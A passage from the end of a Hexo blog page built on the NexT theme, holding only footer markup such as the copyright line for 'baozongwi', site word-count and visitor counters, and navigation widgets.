          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 2024 – 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">baozongwi</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="Word count total">3.1m</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">87:21</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>

</body>
</html>
